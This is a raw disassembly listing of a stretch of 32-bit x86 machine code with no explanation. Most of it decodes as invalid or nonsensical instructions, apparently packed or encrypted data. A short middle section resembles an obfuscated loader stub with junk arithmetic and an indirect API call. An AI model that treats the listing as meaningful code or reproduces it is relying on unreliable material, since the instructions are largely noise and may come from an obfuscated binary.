  41a8cd:	popf   
  41a8ce:	jecxz  0x41a899
  41a8d0:	mov    esi,0xb6b1f004
  41a8d5:	cmc    
  41a8d6:	aad    0x9b
  41a8d8:	adc    dl,0x41
  41a8db:	add    eax,0xad562d41
  41a8e0:	sub    eax,0x295ed118
  41a8e5:	jmp    0xa38fbae2
  41a8ea:	lock push edx
  41a8ec:	repnz push ds
  41a8ee:	(bad)  
  41a8f0:	popf   
  41a8f1:	push   esp
  41a8f2:	(bad)  
  41a8f3:	les    edx,FWORD PTR [si]
  41a8f6:	into   
  41a8f7:	icebp  
  41a8f8:	cwde   
  41a8f9:	scas   al,BYTE PTR es:[edi]
  41a8fa:	add    esi,DWORD PTR [edx]
  41a8fc:	mov    ch,0xe6
  41a8fe:	aas    
  41a8ff:	dec    eax
  41a900:	cmp    eax,DWORD PTR [edx+0x57]
  41a903:	mov    bh,BYTE PTR [ebp+0x3f]
  41a906:	sub    ecx,DWORD PTR [ecx]
  41a908:	or     edx,DWORD PTR [esi+edx*2+0x1e]
  41a90c:	leave  
  41a90d:	es je  0x41a973
  41a910:	(bad)  
  41a911:	mov    ecx,0xa624260e
  41a916:	imul   esp,DWORD PTR [ebx],0x45f0de8c
  41a91c:	icebp  
  41a91d:	mov    ds:0x90608eba,al
  41a922:	or     DWORD PTR [ecx-0x651a041a],ecx
  41a928:	jbe    0x41a8dd
  41a92a:	xchg   edx,eax
  41a92b:	test   BYTE PTR [ecx+0xe],ah
  41a92e:	imul   ebx,DWORD PTR [esi-0x22f383c],0xc879d2c9
  41a938:	lods   eax,DWORD PTR ds:[esi]
  41a939:	jne    0x41a93a
  41a93b:	and    eax,0x23bda9cc
  41a940:	mov    eax,esp
  41a942:	js     0x41a9b0
  41a944:	imul   edi,esi,0xffffff81
  41a947:	frstor [edi+0x7bf48355]
  41a94d:	inc    edi
  41a94e:	shr    edi,0xc9
  41a951:	(bad)
  41a955:	cdq    
  41a956:	mov    al,0x99
  41a958:	fwait
  41a959:	pop    edi
  41a95a:	push   es
  41a95b:	jb     0x41a926
  41a95d:	adc    al,0xb
  41a960:	xchg   ecx,eax
  41a961:	jo     0x41a98c
  41a963:	in     eax,dx
  41a964:	enter  0x3ec4,0x52
  41a968:	addr16 std 
  41a96a:	jmp    0x43f4:0xc1e3f4ab
  41a971:	or     al,0x92
  41a973:	push   ss
  41a974:	jp     0x41a8fd
  41a976:	out    dx,al
  41a977:	jmp    0x41a9a1
  41a979:	ins    BYTE PTR es:[edi],dx
  41a97a:	int3   
  41a97b:	popa   
  41a97c:	xchg   ebx,eax
  41a97d:	out    0x6b,al
  41a97f:	mov    ch,0x3a
  41a981:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a982:	push   DWORD PTR [ecx]
  41a984:	mov    ebp,0xb6910e45
  41a989:	outs   dx,DWORD PTR ds:[esi]
  41a98a:	inc    esi
  41a98b:	imul   ebp,edi,0x4aecd85d
  41a991:	jmp    0x7971:0x1884d0f6
  41a998:	mov    ss,ebx
  41a99a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a99b:	fstp   QWORD PTR [esi-0x1c]
  41a99e:	aad    0x6a
  41a9a0:	cdq    
  41a9a1:	loopne 0x41a923
  41a9a3:	repz fistp DWORD PTR [esi+0x58]
  41a9a7:	pop    es
  41a9a8:	outs   dx,DWORD PTR ds:[esi]
  41a9a9:	cmp    DWORD PTR [ebx],edi
  41a9ab:	mov    al,BYTE PTR [edx-0x58ce5b49]
  41a9b1:	or     DWORD PTR [ebp-0x4c49844a],0xd4524014
  41a9bb:	xchg   edx,eax
  41a9bc:	sub    eax,0x72b5ab5f
  41a9c2:	mov    edi,0x1213b950
  41a9c7:	stc    
  41a9c8:	dec    edi
  41a9c9:	popa   
  41a9ca:	adc    BYTE PTR [ebx-0x62],dl
  41a9cd:	aad    0xba
  41a9cf:	jmp    0x4ea42b27
  41a9d4:	inc    edx
  41a9d5:	fxch   st(6)
  41a9d7:	das    
  41a9d8:	mov    ebx,0xc2d81220
  41a9dd:	cmp    DWORD PTR [edx+0xc],eax
  41a9e0:	rcl    DWORD PTR [ebx+edx*4+0x56],0xe1
  41a9e5:	push   esi
  41a9e6:	pop    eax
  41a9e7:	lods   al,BYTE PTR ds:[esi]
  41a9e8:	fnstenv ds:0xdf52ae97
  41a9ee:	mov    bl,0x63
  41a9f0:	retfw  0xbf94
  41a9f4:	mov    dh,0x76
  41a9f6:	inc    esi
  41a9f7:	xchg   ebp,eax
  41a9f8:	mov    ah,0xc6
  41a9fa:	jl     0x41a9fa
  41a9fc:	cmp    eax,ebx
  41a9fe:	add    al,0x38
  41aa00:	shl    BYTE PTR [edx+ebp*4],1
  41aa03:	or     al,0x33
  41aa05:	sbb    al,0x5e
  41aa07:	or     DWORD PTR [edx],esp
  41aa09:	push   esp
  41aa0a:	ins    DWORD PTR es:[edi],dx
  41aa0b:	and    dl,bl
  41aa0d:	mov    bh,bl
  41aa0f:	cmc    
  41aa10:	pop    ebx
  41aa11:	lock add eax,0xffffffb9
  41aa15:	dec    eax
  41aa16:	popa   
  41aa17:	xor    eax,0xd9b7464d
  41aa1c:	xchg   edi,eax
  41aa1d:	imul   eax,DWORD PTR [esi+0x7a],0x20
  41aa21:	fimul  DWORD PTR [eax+ebx*1+0x5dafe50e]
  41aa28:	dec    ecx
  41aa29:	mov    ebp,0xa56a44bc
  41aa2e:	std    
  41aa2f:	out    dx,eax
  41aa30:	push   ds
  41aa31:	inc    ebp
  41aa32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa33:	fild   WORD PTR [esi+esi*2]
  41aa36:	adc    BYTE PTR [ecx+0x21ba206e],ah
  41aa3c:	pop    ecx
  41aa3d:	cmc    
  41aa3e:	stc    
  41aa3f:	ins    BYTE PTR es:[edi],dx
  41aa40:	mov    bh,BYTE PTR [esi+eiz*1]
  41aa43:	icebp  
  41aa44:	push   ebx
  41aa45:	xor    eax,0xcb956024
  41aa4a:	int    0xc
  41aa4c:	xchg   BYTE PTR [edx],bl
  41aa4e:	call   0x5541aa3e
  41aa53:	dec    ecx
  41aa54:	jmp    0x41a9f8
  41aa56:	cld    
  41aa57:	add    eax,0xc15a6ab0
  41aa5c:	mov    al,0xe9
  41aa5e:	ins    DWORD PTR es:[edi],dx
  41aa5f:	imul   esi,DWORD PTR [ebx+0x2f],0xffffff94
  41aa63:	mov    ecx,0x47c221d6
  41aa68:	jmp    0x8c9d:0x4bdb14ad
  41aa6f:	in     eax,dx
  41aa70:	psrlq  mm7,QWORD PTR [ebx+0x441eee43]
  41aa77:	xchg   edi,eax
  41aa78:	fimul  WORD PTR [ebx]
  41aa7a:	leave  
  41aa7b:	stc    
  41aa7c:	dec    esp
  41aa7d:	dec    eax
  41aa7e:	push   eax
  41aa7f:	or     al,0xc2
  41aa81:	and    eax,0xb2229c12
  41aa86:	push   edx
  41aa87:	adc    BYTE PTR gs:[eax],ch
  41aa8a:	jmp    0xbbd1e6c3
  41aa8f:	stos   BYTE PTR es:[edi],al
  41aa90:	jle    0x41aa18
  41aa92:	add    cl,ah
  41aa94:	inc    esp
  41aa95:	sub    eax,0xcf4d4e8d
  41aa9a:	sahf   
  41aa9b:	add    eax,0xd8d48627
  41aaa0:	mov    edi,0x5b679180
  41aaa5:	xchg   esi,eax
  41aaa6:	push   esi
  41aaa7:	push   cs
  41aaa8:	xchg   ebx,eax
  41aaa9:	int3   
  41aaaa:	sahf   
  41aaab:	fadd   QWORD PTR [edx-0x74]
  41aaae:	push   ebp
  41aaaf:	or     ah,BYTE PTR ds:[ebx+eax*2+0x1]
  41aab4:	out    0x90,eax
  41aab6:	aas    
  41aab7:	sub    al,0x66
  41aab9:	pop    ebx
  41aaba:	inc    esp
  41aabb:	sbb    ebp,eax
  41aabd:	in     eax,dx
  41aabe:	xchg   esp,eax
  41aabf:	call   0x5b82:0xfbdb000b
  41aac6:	pop    ecx
  41aac7:	jno    0x41ab25
  41aac9:	test   BYTE PTR [edi-0x53],cl
  41aacc:	jbe    0x41ab10
  41aace:	push   edx
  41aacf:	mov    ah,0x8d
  41aad1:	test   al,0xad
  41aad3:	ds int 0xc0
  41aad6:	fcmovne st,st(4)
  41aad8:	push   esp
  41aad9:	fisubr WORD PTR [edx+0x3a]
  41aadc:	push   0xfffffff9
  41aade:	out    dx,eax
  41aadf:	ror    BYTE PTR [ebp+edi*8+0x5c],0xc8
  41aae4:	(bad)  
  41aae5:	out    dx,al
  41aae6:	mov    ecx,0xf77f5de0
  41aaeb:	mov    esi,edx
  41aaed:	and    al,0x55
  41aaef:	add    eax,0xa5ba6579
  41aaf4:	call   0xdad0a0dc
  41aaf9:	add    al,0xcc
  41aafb:	add    cl,BYTE PTR [edi-0x52]
  41aafe:	aam    0x89
  41ab00:	loopne 0x41aac9
  41ab02:	jo     0x41aae6
  41ab04:	cld    
  41ab05:	fiadd  WORD PTR [edi]
  41ab07:	mov    ch,0x60
  41ab09:	popa   
  41ab0a:	sub    BYTE PTR [edi-0x66e258f9],dh
  41ab10:	mov    ebp,DWORD PTR [edx+0x46]
  41ab13:	mov    ah,0xe3
  41ab15:	fadd   st,st(6)
  41ab17:	lods   eax,DWORD PTR ds:[esi]
  41ab18:	test   al,0xb9
  41ab1a:	or     al,bh
  41ab1c:	out    0x53,eax
  41ab1e:	sub    al,0x52
  41ab20:	inc    edi
  41ab21:	dec    edi
  41ab22:	test   eax,0xbd060e8f
  41ab27:	js     0x41aae7
  41ab29:	inc    eax
  41ab2a:	lds    edx,FWORD PTR [ebx+0x487d72c3]
  41ab30:	rcr    ah,cl
  41ab32:	inc    eax
  41ab33:	call   0x41c4e8db
  41ab38:	cmp    BYTE PTR [eax],cl
  41ab3a:	cmp    DWORD PTR [eax+0x547cb732],edx
  41ab40:	call   0xc0ae1111
  41ab45:	mov    ebx,0x9e89085f
  41ab4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab4b:	cwde   
  41ab4c:	ficomp DWORD PTR [ecx-0x43d47a41]
  41ab52:	adc    cl,bh
  41ab54:	add    BYTE PTR [eax],0x1e
  41ab57:	push   es
  41ab58:	not    BYTE PTR [ebp-0x1f1b261f]
  41ab5e:	es mov ch,0xa0
  41ab61:	loopne 0x41aba3
  41ab63:	bound  edi,QWORD PTR [esi+0x3bc14128]
  41ab69:	retf   
  41ab6a:	cld    
  41ab6b:	or     dh,dh
  41ab6d:	enter  0x1fcd,0x0
  41ab71:	add    al,0x7c
  41ab73:	mov    ebp,ebp
  41ab75:	adc    eax,0xd19dbede
  41ab7a:	loopne 0x41ab26
  41ab7c:	scas   al,BYTE PTR es:[edi]
  41ab7d:	dec    eax
  41ab7e:	mov    BYTE PTR [ebp+0x56],cl
  41ab81:	dec    ebp
  41ab82:	pop    edi
  41ab83:	test   eax,0xef707e6c
  41ab88:	sub    bh,dh
  41ab8a:	(bad)  
  41ab8b:	ret    0x4f0
  41ab8e:	xchg   ebp,eax
  41ab8f:	jl     0x41abd5
  41ab91:	or     DWORD PTR [esp+eax*4-0x3cbaed6c],esp
  41ab98:	adc    al,0x31
  41ab9a:	push   0x4f
  41ab9c:	adc    al,0x63
  41ab9e:	push   edx
  41ab9f:	sub    edi,edi
  41aba1:	or     BYTE PTR [esi+0x7ab11c42],al
  41aba7:	mov    ebp,0x44247bb
  41abac:	lds    edx,FWORD PTR [edx]
  41abae:	daa    
  41abaf:	xor    BYTE PTR [esi-0x63],bh
  41abb2:	cmp    al,0x96
  41abb4:	mov    DWORD PTR [eax+ebx*1-0x57f16e9b],ebp
  41abbb:	push   ss
  41abbc:	ds mov bl,0xb6
  41abbf:	push   eax
  41abc0:	std    
  41abc1:	push   cs
  41abc2:	mov    al,0x9a
  41abc4:	or     edi,ecx
  41abc6:	and    dh,dl
  41abc8:	call   0xb0df:0x5bb15385
  41abcf:	sbb    BYTE PTR [edi-0x32020da],al
  41abd5:	inc    ebx
  41abd6:	icebp  
  41abd7:	pop    edx
  41abd8:	aam    0x73
  41abda:	out    0x62,eax
  41abdc:	sti    
  41abdd:	mov    eax,ds:0x30ffb6b5
  41abe2:	ret    0xbd6
  41abe5:	jno    0x41abdf
  41abe7:	mov    ebx,0x61ccf1f9
  41abec:	(bad)  [edi+0x739af613]
  41abf2:	adc    DWORD PTR [edx-0x43dbf1ce],esp
  41abf8:	mov    ch,dh
  41abfa:	inc    esi
  41abfb:	inc    eax
  41abfc:	dec    ecx
  41abfd:	jne    0x41abc2
  41abff:	pop    es
  41ac00:	fdivr  DWORD PTR [ebx]
  41ac02:	jge    0x41abdd
  41ac04:	push   ebp
  41ac05:	out    0xfb,eax
  41ac07:	ror    DWORD PTR [esi-0xb],1
  41ac0a:	mov    edi,0x4d714106
  41ac0f:	out    0x5b,al
  41ac11:	outs   dx,BYTE PTR ds:[esi]
  41ac12:	dec    ebp
  41ac13:	push   ss
  41ac14:	xlat   BYTE PTR ss:[ebx]
  41ac16:	add    edi,DWORD PTR [edx]
  41ac18:	push   ds
  41ac19:	hlt    
  41ac1a:	out    dx,al
  41ac1b:	xor    DWORD PTR [eax-0x2e],ebx
  41ac1e:	repnz or esi,DWORD PTR [ecx]
  41ac21:	xor    BYTE PTR [eax+0x3ee8e95d],ch
  41ac27:	sbb    BYTE PTR [eax+0x1f10ae3e],dh
  41ac2d:	adc    dh,BYTE PTR [edi+eax*2]
  41ac30:	ror    ecx,1
  41ac32:	lahf   
  41ac33:	lods   eax,DWORD PTR ds:[esi]
  41ac34:	mov    dh,0xec
  41ac36:	arpl   ax,di
  41ac38:	sub    eax,0x954acf24
  41ac3d:	or     al,0x53
  41ac3f:	sbb    bh,ah
  41ac41:	retf   0x4396
  41ac44:	inc    edx
  41ac45:	sbb    al,0x58
  41ac47:	push   eax
  41ac48:	inc    eax
  41ac49:	xor    DWORD PTR [ebx],0xdfd40a80
  41ac4f:	fidiv  WORD PTR [ebp-0x75273cf6]
  41ac55:	add    al,0xb
  41ac57:	push   ss
  41ac58:	and    esp,ebx
  41ac5a:	imul   esp,DWORD PTR [esi+eiz*2+0x48],0x58
  41ac5f:	mov    WORD PTR [eax+ebp*8],?
  41ac62:	shl    cl,cl
  41ac64:	(bad)  
  41ac66:	test   al,0x4c
  41ac68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac69:	mov    ah,0x77
  41ac6b:	imul   esi,DWORD PTR [ebx-0x2bc6d7e6],0xfd8eea8
  41ac75:	mov    ah,0x84
  41ac77:	xchg   ebx,eax
  41ac78:	dec    ecx
  41ac79:	adc    bh,BYTE PTR [edx-0x78f1b8ee]
  41ac7f:	in     al,dx
  41ac80:	in     eax,0x5
  41ac82:	jno    0x41ac19
  41ac84:	jmp    0xc1197e47
  41ac89:	ret    
  41ac8a:	inc    eax
  41ac8b:	inc    edi
  41ac8c:	inc    edi
  41ac8d:	out    dx,al
  41ac8e:	xor    ecx,esi
  41ac90:	ja     0x41ac4c
  41ac92:	jmp    DWORD PTR [ecx]
  41ac94:	add    BYTE PTR [eax],al
  41ac96:	add    DWORD PTR ds:0x422942,0x42b3
  41aca0:	sub    edx,eax
  41aca2:	mov    eax,ds:0x4228ea
  41aca7:	push   esi
  41aca8:	mov    eax,0xb49
  41acad:	sbb    eax,ecx
  41acaf:	cmp    DWORD PTR ds:0x422916,0x0
  41acb6:	mov    DWORD PTR ds:0x4229d2,ebx
  41acbc:	mov    DWORD PTR ds:0x42293a,ecx
  41acc2:	mov    DWORD PTR ds:0x422942,ecx
  41acc8:	jmp    0x41ad23
  41accd:	not    DWORD PTR ds:0x4228ce
  41acd3:	jge    0x41acf8
  41acd9:	push   0x7637
  41acde:	call   DWORD PTR ds:0x42a02c
  41ace4:	adc    ecx,DWORD PTR ds:0x42295a
  41acea:	xor    esi,esi
  41acec:	xor    esi,DWORD PTR ds:0x4228ea
  41acf2:	and    DWORD PTR ds:0x422952,esi
  41acf8:	sbb    DWORD PTR ds:0x422986,ebx
  41acfe:	mov    esi,DWORD PTR ds:0x422a9a
  41ad04:	mov    ecx,DWORD PTR ds:0x422afa
  41ad0a:	sub    ecx,esi
  41ad0c:	add    esi,DWORD PTR [esi+ecx*1]
  41ad0f:	xor    ecx,ecx
  41ad11:	xor    ecx,DWORD PTR ds:0x4228ae
  41ad17:	or     DWORD PTR ds:0x422896,ecx
  41ad1d:	sbb    ecx,DWORD PTR ds:0x422976
  41ad23:	mov    ecx,DWORD PTR [ebp-0x20]
  41ad26:	mov    esi,DWORD PTR [ebp-0x1c]
  41ad29:	jmp    0x41b172
  41ad2e:	test   BYTE PTR [eax+ecx*2+0x7c],ah
  41ad32:	sub    BYTE PTR [eax],ah
  41ad34:	cmp    BYTE PTR [ebp+eax*1-0x4e],dl
  41ad38:	cmc    
  41ad39:	push   0xb4072846
  41ad3e:	int    0x1d
  41ad40:	or     al,0x16
  41ad42:	(bad)  
  41ad43:	push   cs
  41ad44:	push   ss
  41ad45:	push   ss
  41ad46:	cdq    
  41ad47:	lea    eax,[ebp+eiz*8+0x7383c055]
  41ad4e:	pop    esp
  41ad4f:	mov    dh,0x7a
  41ad51:	xchg   edx,eax
  41ad52:	and    eax,0xef67dd94
  41ad57:	jbe    0x41ad2f
  41ad59:	call   0x6d1f:0x88b4d5e7
  41ad60:	int    0x6e
  41ad62:	imul   ebx,ebp,0xdce006d9
  41ad68:	fiadd  DWORD PTR [ebx]
  41ad6a:	mov    dl,0xda
  41ad6c:	sbb    DWORD PTR [esi+ebx*1-0x2a50a9a],0xcc4c5ede
  41ad77:	xchg   ecx,eax
  41ad78:	std    
  41ad79:	retf   
  41ad7a:	mov    edx,0x36f44cb9
  41ad7f:	call   0x681c:0xe76345c1
  41ad86:	sar    DWORD PTR [ebx-0x20],cl
  41ad89:	pop    edx
  41ad8a:	sbb    eax,0xb19f610e
  41ad8f:	icebp  
  41ad90:	out    0xab,al
  41ad92:	scas   al,BYTE PTR es:[edi]
  41ad93:	js     0x41adc2
  41ad95:	fisub  WORD PTR [esi+0x21]
  41ad98:	mov    ah,BYTE PTR [ebx-0x3e7bf91b]
  41ad9e:	jp     0x41ad4e
  41ada0:	push   eax
  41ada1:	adc    BYTE PTR [edx],ah
  41ada3:	outs   dx,DWORD PTR ds:[esi]
  41ada4:	inc    edx
  41ada5:	mov    esi,0x5fe24c6f
  41adaa:	jmp    0x1810e5e6
  41adaf:	mov    ebx,ds
  41adb1:	xor    eax,0x21ace4ec
  41adb6:	nop
  41adb7:	sub    eax,0xbe849743
  41adbc:	dec    ebx
  41adbd:	sub    BYTE PTR [ebx],0xc8
  41adc0:	das    
  41adc1:	shl    BYTE PTR [edx-0xd441b67],1
  41adc7:	pop    ss
  41adc8:	cwde   
  41adc9:	in     eax,dx
  41adca:	xchg   edx,eax
  41adcb:	fst    st(2)
  41adcd:	xchg   edx,eax
  41adce:	add    DWORD PTR [ebx-0x63],eax
  41add1:	js     0x41ad89
  41add3:	xchg   ah,cl
  41add5:	add    DWORD PTR ss:0xa1a54ae6,edx
  41addc:	ja     0x41ade4
  41adde:	pop    edi
  41addf:	xlat   BYTE PTR ds:[ebx]
  41ade0:	and    BYTE PTR ss:[ecx+0x11],dh
  41ade4:	loop   0x41ad8b
  41ade6:	sub    edi,DWORD PTR [esi]
  41ade8:	jne    0x41adc9
  41adea:	stos   BYTE PTR es:[edi],al
  41adeb:	add    al,0xa0
  41aded:	mov    cl,BYTE PTR [ebx+0x8814079]
  41adf3:	iret   
  41adf4:	mov    bl,0x36
  41adf6:	std    
  41adf7:	push   es
  41adf8:	cdq    
  41adf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41adfa:	pop    ds
  41adfb:	call   0xd6b425fe
  41ae00:	gs jmp 0xf2a8:0xc70393bf
  41ae08:	mov    dl,0xda
  41ae0a:	jmp    0x98cf9d30
  41ae0f:	xchg   ebp,eax
  41ae10:	in     eax,dx
  41ae11:	leave  
  41ae12:	js     0x41adb8
  41ae14:	xchg   ebx,eax
  41ae15:	stc    
  41ae16:	adc    al,0xcb
  41ae18:	(bad)  [edx]
  41ae1a:	fnsave [esi-0x5bdcd0cf]
  41ae20:	jg     0x41ae58
  41ae22:	dec    esp
  41ae23:	(bad)  
  41ae24:	ds jle 0x41ae2d
  41ae27:	push   0x24ec3753
  41ae2c:	push   eax
  41ae2d:	jns    0x41aeab
  41ae2f:	ins    BYTE PTR es:[edi],dx
  41ae30:	cmp    DWORD PTR [edx-0x316b3c14],ecx
  41ae36:	cmovle esi,esi
  41ae39:	pop    edx
  41ae3a:	int    0x86
  41ae3c:	inc    ebx
  41ae3d:	into   
  41ae3e:	ja     0x41ade4
  41ae40:	pop    edx
  41ae41:	clc    
  41ae42:	out    0xf7,eax
  41ae44:	in     al,0xd1
  41ae46:	push   0xffffffe1
  41ae48:	repnz xchg ebx,eax
  41ae4a:	inc    ecx
  41ae4b:	es mov eax,0x7d551b16
  41ae51:	sbb    eax,0x2d1a964d
  41ae56:	push   edi
  41ae57:	push   ss
  41ae58:	push   ecx
  41ae59:	mov    cl,0xf4
  41ae5b:	pop    ecx
  41ae5c:	enter  0xea05,0x6c
  41ae60:	(bad)  
  41ae62:	xor    al,0xb
  41ae64:	dec    edi
  41ae65:	xor    eax,0x105591d8
  41ae6a:	xchg   esi,eax
  41ae6b:	push   ebx
  41ae6c:	rcl    dh,0x11
  41ae6f:	ins    BYTE PTR es:[edi],dx
  41ae70:	cmp    BYTE PTR [ecx-0x6a],bl
  41ae73:	int3   
  41ae74:	mov    ch,0x51
  41ae76:	push   edi
  41ae77:	adc    ch,BYTE PTR [eax-0x1b]
  41ae7a:	jge    0x41aeb1
  41ae7c:	jb     0x41ae80
  41ae7e:	cli    
  41ae7f:	adc    DWORD PTR [ebp+eiz*4-0x7e9b0428],edx
  41ae86:	pextrw eax,(bad),0xc5
  41ae88:	inc    ecx
  41ae89:	add    eax,0xe2e87b35
  41ae8e:	pop    edi
  41ae8f:	ss push ebx
  41ae91:	mov    ebp,0x19800035
  41ae96:	sbb    DWORD PTR [esi],eax
  41ae98:	pavgb  mm7,QWORD PTR [esi+eax*2+0x2bafa886]
  41aea0:	(bad)  
  41aea2:	test   eax,0xf66f15e1
  41aea7:	and    BYTE PTR [edx+0x6e01efc0],bl
  41aead:	test   DWORD PTR gs:[edx],esp
  41aeb0:	cs fcmovnu st,st(4)
  41aeb3:	in     eax,0xa4
  41aeb5:	leave  
  41aeb6:	xchg   ebp,eax
  41aeb7:	inc    eax
  41aeb8:	popa   
  41aeb9:	mov    BYTE PTR [ebx],al
  41aebb:	daa    
  41aebc:	icebp  
  41aebd:	or     DWORD PTR [ecx+0x5e],ecx
  41aec0:	adc    eax,0x33d06180
  41aec5:	imul   ecx,DWORD PTR [edi],0xffffff9c
  41aec8:	sbb    cl,ah
  41aeca:	jae    0x41ae9d
  41aecc:	push   edx
  41aecd:	aad    0xb3
  41aecf:	cmp    al,0x8e
  41aed1:	fstp   DWORD PTR [ebp+0x5313b3a]
  41aed7:	and    dl,ch
  41aed9:	mov    ecx,DWORD PTR [edi]
  41aedb:	cmp    eax,0xa8f4e098
  41aee0:	mov    dl,0x7c
  41aee2:	sar    BYTE PTR [edx+eax*1-0x789d4ab4],cl
  41aee9:	xchg   edi,eax
  41aeea:	sbb    al,0xeb
  41aeec:	pop    ebx
  41aeed:	test   eax,0x116058f5
  41aef2:	aam    0x64
  41aef4:	add    BYTE PTR [eax+0x7024f547],bl
  41aefa:	mov    ds:0x2454a61b,eax
  41aeff:	sub    DWORD PTR [edx+0x73],edi
  41af02:	cmp    DWORD PTR [ecx-0xd],esp
  41af05:	mov    ds:0xb0f7ee4b,eax
  41af0a:	add    esp,DWORD PTR [edx+ecx*1]
  41af0d:	pop    esp
  41af0e:	jns    0x41af08
  41af10:	dec    edx
  41af11:	and    BYTE PTR [ebx],bl
  41af13:	test   al,0xcf
  41af15:	lahf   
  41af16:	and    eax,0x36a5cbc
  41af1b:	jp     0x41aeee
  41af1d:	pop    eax
  41af1e:	sbb    al,cl
  41af20:	sbb    DWORD PTR [eax+0x3c],0x59
  41af24:	xchg   ebp,eax
  41af25:	mov    BYTE PTR [eax+0x6f],dh
  41af28:	jno    0x41af4e
  41af2a:	dec    ebp
  41af2b:	(bad)
  41af30:	add    ecx,esi
  41af32:	sbb    eax,0x71cbdbf5
  41af37:	outs   dx,DWORD PTR ds:[esi]
  41af38:	jo     0x41afa6
  41af3a:	repz int3 
  41af3c:	sbb    eax,DWORD PTR [ecx+0x1d24e97a]
  41af42:	push   0xfffffffc
  41af44:	dec    ebp
  41af45:	or     DWORD PTR ds:0x4352ebf3,ecx
  41af4b:	add    BYTE PTR [ebx+0x5d],0xfb
  41af4f:	ja     0x41afa4
  41af51:	imul   esi,DWORD PTR [esi+0x7b],0xd34a273d
  41af58:	inc    esp
  41af59:	pop    esi
  41af5a:	adc    DWORD PTR [ebp+0x749410b1],0x60
  41af61:	jnp    0x41af00
  41af63:	ss pusha 
  41af65:	xor    bh,BYTE PTR [esi+0x78726bc0]
  41af6b:	dec    ebp
  41af6c:	int    0x59
  41af6e:	xor    DWORD PTR [ecx],ebx
  41af70:	and    BYTE PTR [ebp+0x51],dh
  41af73:	jecxz  0x41afec
  41af75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af76:	adc    al,0xae
  41af78:	xchg   edx,eax
  41af79:	out    0xf2,eax
  41af7b:	(bad)  
  41af7c:	shl    cl,1
  41af7e:	jg     0x41af87
  41af80:	sub    DWORD PTR [esi+edx*8],edi
  41af83:	add    esi,esp
  41af85:	and    ebp,ebx
  41af87:	pop    ebp
  41af88:	retf   0x3ce5
  41af8b:	and    esi,DWORD PTR [esi+0x52]
  41af8e:	pushf  
  41af8f:	daa    
  41af90:	dec    ebp
  41af91:	sahf   
  41af92:	inc    ebp
  41af93:	mov    DWORD PTR [ebx],eax
  41af95:	dec    eax
  41af96:	xor    edx,DWORD PTR [ebp-0x52]
  41af99:	popa   
  41af9a:	stos   DWORD PTR es:[edi],eax
  41af9b:	dec    ebx
  41af9c:	inc    eax
  41af9d:	mov    bh,BYTE PTR [edi-0x44]
  41afa0:	call   0x7d5c:0x13b3f868
  41afa7:	dec    edx
  41afa8:	rol    DWORD PTR ds:0xab06a9dd,cl
  41afae:	adc    DWORD PTR [eax],edi
  41afb0:	xor    BYTE PTR [esi+edx*1],bl
  41afb3:	shl    ebp,0x9e
  41afb6:	ror    BYTE PTR [edx+0xf83f275],1
  41afbc:	push   0xffffffa9
  41afbe:	fwait
  41afbf:	jge    0x41b015
  41afc1:	mov    ds:0xd46d2ad1,eax
  41afc6:	data16 int3 
  41afc8:	mov    ah,al
  41afca:	jmp    0x41b029
  41afcc:	cli    
  41afcd:	test   BYTE PTR [eax-0x35],bl
  41afd0:	sub    eax,0xc2d53c99
  41afd5:	je     0x41afbc
  41afd7:	bound  ecx,QWORD PTR [edx+ebp*8+0x39722676]
  41afde:	xor    BYTE PTR [edx+0x1b],dl
  41afe1:	aaa    
  41afe2:	adc    dh,BYTE PTR [ebx]
  41afe4:	mov    bl,0xbb
  41afe6:	pop    ebx
  41afe7:	dec    eax
  41afe8:	int    0x75
  41afea:	bound  ecx,QWORD PTR [eax]
  41afec:	cld    
  41afed:	jmp    0x9ace:0x84374848
  41aff4:	stc    
  41aff5:	lods   al,BYTE PTR ds:[esi]
  41aff6:	and    BYTE PTR [ebp-0x66],ch
  41aff9:	fisub  WORD PTR [ecx]
  41affb:	popf   
  41affc:	sbb    eax,DWORD PTR [ecx-0x278e5239]
  41b002:	std    
  41b003:	mov    edx,0xbc13ecaa
  41b008:	dec    esi
  41b009:	sbb    eax,0xe7d366f9
  41b00e:	jo     0x41b018
  41b010:	dec    ebx
  41b011:	push   esp
  41b012:	xor    esp,esp
  41b014:	test   DWORD PTR [esi-0x242bfa65],esp
  41b01a:	int    0x77
  41b01c:	and    ah,BYTE PTR [eax+0x34]
  41b01f:	adc    eax,0xbf4a34bb
  41b024:	stc    
  41b025:	jg     0x41afe6
  41b027:	pushf  
  41b028:	adc    DWORD PTR [eax+0x65bb244a],ecx
  41b02e:	ins    DWORD PTR es:[edi],dx
  41b02f:	sub    al,BYTE PTR [ecx+edx*2+0x52]
  41b033:	leave  
  41b034:	and    DWORD PTR [ecx],0xb90ce8a3
  41b03a:	gs inc esi
  41b03c:	mov    es,WORD PTR ds:0x5dcff578
  41b042:	or     bl,BYTE PTR [esi]
  41b044:	add    al,0x86
  41b046:	and    DWORD PTR [ebx+0x14],ecx
  41b049:	js     0x41b086
  41b04b:	add    esi,0x24166457
  41b051:	sub    eax,0xbdd90fa8
  41b056:	nop
  41b057:	ins    DWORD PTR es:[edi],dx
  41b058:	test   DWORD PTR [edi+0x17bed9ec],edx
  41b05e:	sub    esp,esp
  41b060:	mov    ebp,0xe65f23f9
  41b065:	addr16 sti 
  41b067:	mov    eax,0xfe174a4e
  41b06c:	xchg   edx,eax
  41b06d:	stos   DWORD PTR es:[edi],eax
  41b06e:	hlt    
  41b06f:	pop    ebx
  41b070:	repnz shl BYTE PTR [edx+0x41],cl
  41b074:	pop    ds
  41b075:	daa    
  41b076:	push   esp
  41b077:	xchg   ebp,eax
  41b078:	imul   ebx,DWORD PTR [eax+0x162767ee],0xffffff93
  41b07f:	gs push esi
  41b081:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b082:	pop    ebp
  41b083:	jmp    FWORD PTR [ebp-0x265f03a]
  41b089:	in     eax,0x1a
  41b08b:	out    dx,al
  41b08c:	inc    ebp
  41b08d:	pop    ebx
  41b08e:	push   esp
  41b08f:	dec    ebp
  41b090:	xlat   BYTE PTR ds:[ebx]
  41b091:	mov    esp,0xd578aaa4
